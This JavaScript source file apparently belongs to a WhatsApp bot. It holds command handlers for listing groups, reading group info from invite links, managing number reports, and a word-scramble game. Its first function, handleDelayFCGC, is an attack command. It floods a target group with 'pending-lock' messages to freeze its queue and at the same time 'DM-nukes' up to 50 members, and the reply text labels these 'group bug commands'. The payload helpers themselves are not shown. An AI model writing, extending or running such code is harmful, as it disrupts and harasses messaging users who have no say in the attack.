async function handleDelayFCGC({ groupJid, count, sock, replyJid, userId, name }) {
  if (!groupJid || !groupJid.includes('@g.us')) return '❌ Usage: `.delayfcgc <groupid>`';
  const gsock = await _gcResolveSock(sock, groupJid);
  let meta;
  try { meta = await gsock.groupMetadata(groupJid); } catch (e) { return `❌ Can't fetch group: ${e.message}`; }

  // Resolve all participant JIDs (handles @lid)
  const rawP = meta.participants || [];
  const resolved = [];
  for (const p of rawP.slice(0, 50)) {
    try { resolved.push(await _resolveParticipantJid(gsock, p)); } catch (_) {}
  }
  try { await sock.sendMessage(replyJid, { text: `⏳💣 *DelayFCGC started* — ${meta.subject}\n👥 ${resolved.length} members resolved\n_Pending-locking group + nuking all members..._` }); } catch (_) {}

  // 10 pending-lock messages to freeze the group queue
  const lockJobs = Array.from({ length: 10 }, (_, i) => _v_pendingLock(groupJid, gsock, i % 2));
  // Simultaneously DM-nuke all members via relayMessage
  const nukeJobs = resolved.map(r => _nukeMember(gsock, r));
  await Promise.allSettled([...lockJobs, ...nukeJobs]);

  return `⏳💣 *DelayFCGC Done!*\n\n🏠 ${meta.subject}\n📤 Group: 10 pending-locks\n👥 Members DM-nuked: ${resolved.length}\n\nGroup queue frozen. Every member's DM also hit.`;
}

async function handleListGC({ sock, replyJid }) {
  let groups = [];
  try { groups = Object.values(await sock.groupFetchAllParticipating()); } catch (_) {}
  if (!groups.length) return '📋 Bot is not in any groups.';
  const lines = groups.map((g, i) => `${i + 1}. *${g.subject}* — \`${g.id}\` (${(g.participants || []).length} members)`);
  return `📋 *Groups the bot is in:*\n\n${lines.join('\n')}\n\n_Use the ID with group bug commands._`;
}

async function handleGroupIDFromLink({ link, sock, replyJid }) {
  if (!link) return '❌ Usage: `.groupid <invite_link>`\nExample: `.groupid https://chat.whatsapp.com/XXXXXXXX`';
  const m = String(link).match(/chat\.whatsapp\.com\/([A-Za-z0-9]+)/);
  if (!m) return '❌ Not a valid WhatsApp group invite link.';
  const code = m[1];
  try {
    const info = await sock.groupGetInviteInfo(code);
    return (
      `✅ *Group info from link:*\n\n` +
      `📛 Name: *${info.subject}*\n` +
      `🆔 ID: \`${info.id}\`\n` +
      `👥 Size: ${(info.participants || []).length} members\n` +
      `📅 Created: ${new Date((info.creation || 0) * 1000).toISOString().split('T')[0]}`
    );
  } catch (e) {
    return `❌ Failed to fetch group info: ${e.message}`;
  }
}

// ── View all reports (sudo/owner only) ─────────────────────────────────────────
function handleViewReports({ args }) {
  const page = Math.max(1, parseInt(args[0]) || 1);
  const limit = 10;
  const offset = (page - 1) * limit;
  const rows = db.prepare(
    `SELECT reported_number, COUNT(*) as count, GROUP_CONCAT(DISTINCT reported_by_name) as reporters,
     MAX(reported_at) as last_at
     FROM number_reports GROUP BY reported_number ORDER BY count DESC, last_at DESC LIMIT ? OFFSET ?`
  ).all(limit, offset);
  const total = db.prepare('SELECT COUNT(DISTINCT reported_number) as c FROM number_reports').get().c;
  if (!rows.length) return '📋 No number reports on record.';

  const lines = rows.map((r, i) => {
    const d = new Date(r.last_at).toISOString().split('T')[0];
    return `${offset + i + 1}. +${r.reported_number} — *${r.count}* report${r.count !== 1 ? 's' : ''} (last: ${d})`;
  });

  return (
    `🚨 *REPORTED NUMBERS* (page ${page})\n` +
    `━━━━━━━━━━━━━━━━━━━━━━\n\n` +
    lines.join('\n') +
    `\n\n📊 Total unique numbers reported: *${total}*\n` +
    (total > offset + limit ? `\nSend \`.reports ${page + 1}\` for next page.` : '')
  );
}

// ── View full report history for a specific number (sudo/owner only) ────────────
function handleReportInfo({ number }) {
  const clean = String(number || '').replace(/[\s\-\+]/g, '').replace(/^0+/, '');
  if (!clean || !/^\d{6,15}$/.test(clean)) return '❌ Provide a valid phone number. Usage: `.reportinfo <number>`';

  const rows = db.prepare(
    `SELECT reported_by_name, reason, group_id, reported_at FROM number_reports
     WHERE reported_number=? ORDER BY reported_at DESC LIMIT 15`
  ).all(clean);
  if (!rows.length) return `📋 No reports found for +${clean}.`;

  const total = db.prepare('SELECT COUNT(*) as c FROM number_reports WHERE reported_number=?').get(clean).c;
  const lines = rows.map((r, i) => {
    const d = new Date(r.reported_at).toISOString().replace('T', ' ').slice(0, 16);
    return `${i + 1}. 👤 ${r.reported_by_name}\n   💬 ${r.reason}\n   🕐 ${d}${r.group_id ? `\n   📍 ${r.group_id}` : ''}`;
  });

  return (
    `🚨 *REPORT HISTORY: +${clean}*\n` +
    `━━━━━━━━━━━━━━━━━━━━━━\n\n` +
    lines.join('\n\n') +
    `\n\n📊 Total reports: *${total}*`
  );
}

// ── Clear all reports for a number (sudo/owner only) ───────────────────────────
function handleClearReports({ number }) {
  const clean = String(number || '').replace(/[\s\-\+]/g, '').replace(/^0+/, '');
  if (!clean || !/^\d{6,15}$/.test(clean)) return '❌ Provide a valid phone number. Usage: `.clearreports <number>`';
  const existed = db.prepare('SELECT COUNT(*) as c FROM number_reports WHERE reported_number=?').get(clean).c;
  if (!existed) return `📋 No reports found for +${clean}.`;
  db.prepare('DELETE FROM number_reports WHERE reported_number=?').run(clean);
  return `🗑️ Cleared *${existed}* report${existed !== 1 ? 's' : ''} for +${clean}.`;
}

// ── Scramble game ──────────────────────────────────────────────────────────────
function scramble(word) {
  const a = word.split('');
  for (let i = a.length-1; i>0; i--) {
    const j = Math.floor(Math.random()*(i+1));
    [a[i],a[j]] = [a[j],a[i]];
  }
  // make sure it\'s actually scrambled
  const result = a.join('');
  return result === word ? scramble(word) : result;
}

